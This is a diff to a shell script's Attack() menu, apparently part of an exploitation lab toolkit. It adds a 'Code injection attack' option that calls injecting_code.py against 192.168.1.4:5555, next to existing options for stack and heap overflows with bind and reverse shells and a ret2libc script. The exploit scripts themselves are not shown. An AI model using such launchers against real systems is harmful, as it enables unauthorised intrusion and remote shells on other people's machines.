@@ -11,7 +11,8 @@ Attack()
 		echo "	Heap Overflow (bind shell) --> 5"
 		echo "	Stack overflow (reverse shell) --> 6"
 		echo "	Heap Overflow (reverse shell) --> 7"
-		echo "	Select new server --> 8"
+		echo "	Code injection attack --> 8"
+		echo "	Select new server --> 9"
 
        		read input
         	case $input in
@@ -37,6 +38,9 @@ Attack()
 				$1/rev_ret2libc.py "192.168.1.4" 5555
 				;;
 			8)
+				$1/injecting_code.py "192.168.1.4" 5555
+				;;
+			9)
 				return
 				;;
                		*) 
@@ -48,7 +52,8 @@ Attack()
 				echo "	Heap Overflow (bind shell) --> 5"
 				echo "	Stack overflow (reverse shell) --> 6"
 				echo "	Heap Overflow (reverse shell) --> 7"
-				echo "	Select new server --> 8"
+				echo "	Code injection attack --> 8"
+				echo "	Select new server --> 9"
 				;;
        		esac
 	done
